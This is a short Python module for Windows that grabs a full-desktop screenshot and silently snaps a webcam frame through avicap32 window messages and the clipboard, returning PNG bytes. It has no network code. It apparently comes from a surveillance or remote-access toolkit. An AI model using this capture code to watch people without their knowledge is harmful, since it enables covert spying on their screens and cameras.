#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author github.com/L1ghtM4n

__all__ = ["CaptureWebcam", "CaptureDesktop"]

# Import modules
from io import BytesIO
from ctypes import windll
from PIL import ImageGrab # pip install Pillow


""" Capture image from desktop """
def CaptureDesktop() -> bytes:
    data = BytesIO()
    with ImageGrab.grab(all_screens=True) as bmp:
        bmp.save(data, "PNG")
    # Return image bytes
    return data.getvalue()


""" Capture image from webcam """
def CaptureWebcam(timeout:int=3500) -> bytes:
    data = BytesIO()
    # Create capture window
    hwnd = windll.avicap32.capCreateCaptureWindowA("WebCap", 
    	0x80000000 | 0x40000000, 0, 0, 640, 480, 0, 0)
    # If created successfully
    if hwnd != 0:
        windll.user32.SendMessageA(hwnd, 1034, 0, 0)
        windll.kernel32.Sleep(timeout)
        windll.user32.SendMessageA(hwnd, 1084, 0, 0)
        windll.user32.SendMessageA(hwnd, 1054, 0, 0)
        windll.user32.SendMessageA(hwnd, 1035, 0, 0)
        # Get image bytes
        bmp = ImageGrab.grabclipboard()
        if hasattr(bmp, "save"):
            bmp.save(data, "PNG")
    # Return image bytes
    return data.getvalue()

